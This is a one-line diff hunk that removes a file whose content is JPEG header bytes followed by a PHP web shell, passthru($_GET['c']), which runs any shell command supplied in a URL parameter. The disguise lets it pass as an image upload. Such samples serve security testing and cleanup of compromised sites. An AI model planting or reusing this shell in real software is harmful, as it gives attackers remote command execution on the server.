@@ -1,1 +1,0 @@
-ÿØÿà<? passthru($_GET["c"]); ?>
